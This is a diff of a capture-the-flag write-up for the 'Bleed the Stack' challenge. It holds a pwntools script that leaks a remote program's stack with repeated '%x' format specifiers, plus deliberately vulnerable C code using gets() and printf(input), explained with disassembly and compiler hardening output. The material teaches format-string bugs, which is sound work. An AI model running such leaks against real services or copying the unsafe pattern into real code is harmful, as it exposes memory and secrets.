@@ -1,5 +1,6 @@
 ---
 title: "Bleed the Stack"
+link: "https://0x0539.net/play/fangorn/bleedthestack"
 description: "An amateur programmer decides that for his hello world program, he will echo whatever you say. Can you find his mistake?"
 author: "0x0539"
 date: "2023-05-16"
@@ -10,8 +11,11 @@ tags: ["capture the flag", "0x0539", "binex"]
 # Bleed the Stack
 
 <aside>
+<a href={link}>{title} @ {author}</a><br/>
 An amateur programmer decides that for his hello world program, he will echo whatever you say. Can you find his mistake?
 </aside>
+
+## Identifying a vulnerability
 
 This challenge is based around a command-line program served over `netcat`. Passing the challenge url and port to `nc`, the challenge responds with the following
 and prompts us for input:
@@ -24,8 +28,9 @@ ADVANCED CHALLENGE :: BLEED THE STACK
 Test me! Enter your name and I'll print it back to you!
 ```
 
-Given the challenge's name, our flag is probably hidden in this program's call stack, so I start off by sending `%x`, or a hexadecimal format string specifier.
-This returned hex values, which means the program is likely vulnerable to a [format string attack](https://owasp.org/www-community/attacks/Format_string_attack):
+We can enter a string value, and the program will respond to our input with our exact input.
+
+Given the challenge's name, our flag is probably hidden in this program's call stack - we can test this by sending a hexdecimal format string parameter, `%x`:
 
 ```bash
 # ...
@@ -35,10 +40,15 @@ Test me! Enter your name and I'll print it back to you!
 40 f7f77620 1 0 1 20656854 73736170 64726f77
 ```
 
+We get hex values as the response, which means the program is likely assembled from code containing a [format string bug](https://owasp.org/www-community/attacks/Format_string_attack) (I go over
+this bug in a little more detail after the challenge walkthrough).
+
 To confirm this, we can convert the hexadecimal values to ASCII, yielding the (malformed) string `@÷÷v [f7f77620] ehTssapdrow` (noting that `[f7f77620]` is invalid as ASCII;
 the information here is intended to be read by a CPU and so is not necessarily human-readable text).
 
 The string `ehTssapdrow` stands out as some form of actual text - it's 'little-endian' ordering of the ascii string `The password`.
+
+## Exploiting the vulnerability
 
 We can automate an exploit with the `pwntools` python module:
 - open a connection to the `netcat` server,
@@ -56,12 +66,13 @@ format_str = "%x " * 299
 
 
 def decode_bytes(dword: bytes) -> str:
-    # change endianness to BE & decode
     try:
+        # change endianness to BE & decode
         decoded = bytes.fromhex(dword).decode("ascii")[::-1]
         return "".join([ch for ch in decoded if 32 <= ord(ch) <= 126])
-    # return unchanged array if it can't be decoded
+
     except UnicodeDecodeError:
+        # return unchanged array if it can't be decoded
         print(f"UnicodeDecodeError on bytearray '{dword}'.\n")
         return f" {dword} "
 
@@ -72,15 +83,14 @@ def main():
     s.sendline(format_str)
     raw_bytes = s.recvall().decode().strip()
 
-    # print the values leaked from the call stack to stdout
+    # print raw bytes from stack to stdout
     print(f"\nbytearray:\n{raw_bytes}\n")
     dwords = raw_bytes.split(" ")
 
-    # ensure each array is 4 bytes long
+    # pad incorrect array lengths
     dwords = [dword.zfill(8) for dword in dwords]
     decoded_dwords = "".join([decode_bytes(dword) for dword in dwords])
 
-    # print the decoded values
     print(f"leaked:\n{decoded_dwords}")
 
 
@@ -89,14 +99,130 @@ main()
 
 The initial leaked output from this program's call stack gives us the following raw hex:
 
-```lua
+```
 40 f7f20620 1 0 1 20656854 73736170 64726f77 3a736920 6c5f4920 5f337630 6d723066 625f7434 733675 25207825 78252078 20782520 25207825 78252078 20782520 25207825
 ```
 
 Which our script will parse, decoding ASCII strings from their hexadecimal values:
 
-```lua
+```
 @ f7f20620 The password is: [flag redacted] %x %x %x %x %x %x %x %x %x %
 ```
 
+## On the format string bug
 
+To investigate this bug a little further, we can use the following example `C` source code for a program similar to our target binary:
+
+```c
+#include <stdio.h>
+
+int main(void) {
+
+    char secret[7] = "secret";
+    char input[32]; // buffer for input
+
+    printf("input something to be repeated:\n");
+
+    gets(input); // read from stdin
+    printf(input); // print input to stdout
+
+    return 0;
+}
+```
+
+### Reading from the stack
+
+Simplifying some low-level functionality a bit, the gist of the compiled instructions might look something like the following:
+
+- do some setup before calling the `main()` function,
+- allocate a 7-byte buffer on the stack - 6-byte string, 'secret', plus a null byte to denote the end of the string,
+- allocate another 32-byte buffer for the user input below the secret for input from `gets()`.
+- print a hardcoded prompt
+- read user input from `stdin`, storing that data into the section of `input` memory,
+- repeat the value of `input` back to the user
+- hit the base of `main()`s stack frame and return to calling stack frame.
+
+```nasm
+; ............
+.text:0000000000001169 ; __unwind {
+.text:0000000000001169                 push    rbp
+.text:000000000000116A                 mov     rbp, rsp
+.text:000000000000116D                 sub     rsp, 64
+.text:0000000000001171                 mov     rax, fs:40
+.text:000000000000117A                 mov     [rbp+var_8], rax
+.text:000000000000117E                 xor     eax, eax
+.text:0000000000001180                 mov     [rbp+var_37], 1919116659
+.text:0000000000001187                 mov     [rbp+var_37+3], 7628146
+.text:000000000000118E                 lea     rax, s          ; "input something to be repeated:"
+.text:0000000000001195                 mov     rdi, rax        ; s
+.text:0000000000001198                 call    _puts
+.text:000000000000119D                 lea     rax, [rbp+format]
+.text:00000000000011A1                 mov     rdi, rax
+.text:00000000000011A4                 mov     eax, 0
+.text:00000000000011A9                 call    _gets
+.text:00000000000011AE                 lea     rax, [rbp+format]
+.text:00000000000011B2                 mov     rdi, rax        ; format
+.text:00000000000011B5                 mov     eax, 0
+.text:00000000000011BA                 call    _printf
+.text:00000000000011BF                 mov     eax, 0
+.text:00000000000011C4                 mov     rdx, [rbp+var_8]
+.text:00000000000011C8                 sub     rdx, fs:28h
+.text:00000000000011D1                 jz      short locret_11D8
+.text:00000000000011D3                 call    ___stack_chk_fail
+.text:00000000000011D8
+.text:00000000000011D8 locret_11D8:                            ; CODE XREF: main+68↑j
+.text:00000000000011D8                 leave
+.text:00000000000011D9                 retn
+```
+> A compiler will make its own optimizations (modern security settings are also enabled for this binary), and then a disassembler will make further assumptions, but the general idea is there.
+
+While this `gets()` call leaves the program vulnerable to a buffer overflow, the relevant point of interest here is the `printf()` call - `printf()` is not explicitly told the expected format of
+`input`, or how many arguments to expect. This means if `input` contains any format specifiers, it will call each specifier as an argument, continuing to read values from the stack past its
+allocated buffer.
+
+To demonstrate this, the following explicitly passes both
+1. the number of intended arguments and their format - `%s` (as in **s**tring),
+2. the intended argument holding the value, `input`:
+
+```c
+// ...
+
+    printf("%s", input);
+
+// ...
+```
+
+### Modern compilers *generally* ship with built-in binary security
+
+As far as I am aware, most modern compilers and CPUs will bundle security settings (`RELRO`, `NX` bits, Stack canaries, `PIE`) into ELF binaries as a way to 'harden', or make common vulnerabilities
+harder to exploit. This would likely have been **specifically** disabled on 0x0539's end, given the purposes of the challenge.
+
+For example, here we compile and run the above `C` program with default `gcc` settings, and we are not only notified of the potential security issues around `gets()`, but various protections
+are compiled into our binary by default; for example, note that we trigger a `SIGIOT` when we try to exploit this program using format specifiers in the same way:
+
+```bash
+$ gcc fstring_bug.c
+fstring_bug.c: In function ‘main’:
+fstring_bug.c:10:5: warning: implicit declaration of function ‘gets’; did you mean ‘fgets’? [-Wimplicit-function-declaration]
+   10 |     gets(input); // read from stdin
+      |     ^~~~
+      |     fgets
+/usr/bin/ld: /tmp/cc0Q5Rm3.o: in function `main':
+fstring_bug.c:(.text+0x41): warning: the `gets' function is dangerous and should not be used.
+
+$ pwn checksec a.out
+[*] '/home/please/Documents/scripts/a.out'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+
+$ ./a.out
+input something to be repeated:
+%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
+*** stack smashing detected ***: terminated
+[1]    141503 IOT instruction (core dumped)  ./a.out
+```
+
+Note that there are ways around this, but the simple approach of `%x` spam is no longer possible.
